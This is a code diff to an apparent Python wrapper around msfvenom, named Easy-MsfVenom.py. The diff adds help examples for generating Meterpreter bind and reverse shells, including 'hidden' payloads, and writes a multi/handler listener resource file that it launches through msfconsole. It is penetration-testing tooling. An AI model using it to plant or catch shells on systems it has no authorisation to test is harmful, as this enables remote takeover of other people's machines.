@@ -12,6 +12,7 @@
 #-----------------------------------------------------------------#
 
 import argparse
+import textwrap
 import socket
 import sys
 import subprocess
@@ -20,8 +21,31 @@ import os
 
 def parse_options():
 
-    parser = argparse.ArgumentParser(description='python MiniMV.py -t win -met -a x64 -stageless -ip 127.0.0.1 -p 1234 ')
-    parser.add_argument("-t", "--type", type=str, help="Shell type: Win, Lin , Web", dest='SHELL_TYPE')
+    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, \
+    description= textwrap.dedent('''python3 ./Easy-MsfVenom.py -t win 
+
+Interactive mode:
+-----------------
+    - Win shells /payloads : ./Easy-MsfVenom.py  -t win
+    - Linux shells /payloads : ./Easy-MsfVenom.py  -t lin
+    - Web shells /payloads (PHP,ASP, Java) :./Easy-MsfVenom.py  -t web
+    
+Classics:
+---------
+    - Meterpreter Win(x86) Staged Bind_TCP payloads:  ./Easy-MsfVenom.py  -t win -m
+    - Meterpreter Win(x86) Staged Rev. TCP payloads:  ./Easy-MsfVenom.py  -t win -m -r
+
+Custom search:
+---------------
+    -  Hidden Meterpreter Windows(x86) Bind_TCP payloads : ./Easy-MsfVenom.py  -t win -m -k hidden
+
+Full control:
+------------
+    - Meterpreter Win(x64) Stageless Reverse_TCP payloads:  ./Easy-MsfVenom.py  -t win -a x64 -m -s -r -p 4444
+
+        
+    '''))
+    parser.add_argument("-t", type=str, help="Type of Shell: Win, Lin , Web", dest='SHELL_TYPE')
     parser.add_argument("-m", "--met", help="Specify if Meterpreter shell", action ='store_true')
     parser.add_argument("-a", "--arch",  default="x86", type=str, help="Architecture (default x86) : x86, x64")
     parser.add_argument("-r", "--rev", help="Reverse Shell (default is BIND shell)", action='store_true')
@@ -112,11 +136,12 @@ def generate_payload(params,number,avail_payloads,pname):
             #msf_cmd= "msfconsole -x \'use multi/handler; set LHOST {}; set LPORT {}; run\'".format(IP,PORT)
             #msf_cmd= "msfconsole -x 'use multi/handler; set LHOST {}; set LPORT {}; run' ".format(IP,PORT)
             
-            msf_cmd ="use multi/handler;set LHOST {}; set LPORT {}; run".format(IP,PORT)
-            print("listener ",  msf_cmd)
-            '''l_cmd = "echo {} > listener.rc".format(msf_cmd)
-            subprocess.call(l_cmd,shell=True)            
-            '''
+            msf_cmd ='''use multi/handler
+            set LHOST {}
+            set LPORT {}
+            run'''.format(IP,PORT)
+            with open("listener.rc","w") as f:
+                f.write(msf_cmd)
             
             print(Green("[*] Launching Metasploit ..."))
             subprocess.call("qterminal -e msfconsole -r listener.rc", shell=True)
